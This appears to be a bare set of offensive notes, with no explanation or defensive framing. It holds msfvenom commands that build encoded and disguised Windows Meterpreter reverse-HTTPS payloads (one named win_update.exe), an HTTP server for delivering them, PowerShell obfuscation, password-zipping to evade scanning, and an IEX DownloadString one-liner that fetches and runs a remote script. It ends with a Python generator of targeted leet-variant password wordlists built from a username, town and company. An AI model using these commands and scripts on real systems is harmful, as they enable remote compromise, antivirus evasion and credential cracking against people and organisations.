msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation


http://192.168.1.128:8080/update_pacth.exe

zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')


import itertools

palavras_base = ["rsilva", "atibaia", "suma", "empresa", "admin"]

numeros = ["", "123", "2024", "2023", "2022", "007", "001", "777"]
simbolos = ["", "!", "@", "#", "$"]

# Substituições leet
substituicoes = {
    "a": ["a", "@", "4"],
    "i": ["i", "1"],
    "s": ["s", "$", "5"],
    "o": ["o", "0"],
    "e": ["e", "3"]
}

def gerar_leet_variacoes(palavra):
    combos = [[]]
    for char in palavra:
        novos = []
        if char.lower() in substituicoes:
            for c in substituicoes[char.lower()]:
                for combo in combos:
                    novos.append(combo + [c])
        else:
            for combo in combos:
                novos.append(combo + [char])
        combos = novos
    return set("".join(c) for c in combos)

wordlist = set()

for palavra in palavras_base:
    variacoes_leet = gerar_leet_variacoes(palavra)
    for variacao in variacoes_leet:
        wordlist.add(variacao)
        wordlist.add(variacao.capitalize())
        wordlist.add(variacao.upper())
        # Adiciona combinações com números e símbolos
        for numero in numeros:
            for simbolo in simbolos:
                wordlist.add(variacao + numero)
                wordlist.add(variacao + simbolo)
                wordlist.add(variacao + numero + simbolo)

# Combinações entre palavras
for comb in itertools.permutations(palavras_base, 2):
    base = "".join(comb)
    variacoes_comb = gerar_leet_variacoes(base)
    for variacao in variacoes_comb:
        wordlist.add(variacao)
        for numero in numeros:
            for simbolo in simbolos:
                wordlist.add(variacao + numero)
                wordlist.add(variacao + simbolo)
                wordlist.add(variacao + numero + simbolo)

with open("wordlist_personalizada_advanced.txt", "w") as file:
    for senha in wordlist:
        file.write(senha + "\n")

print(f"[+] Wordlist avançada gerada com {len(wordlist)} combinações -> wordlist_personalizada_advanced.txt")



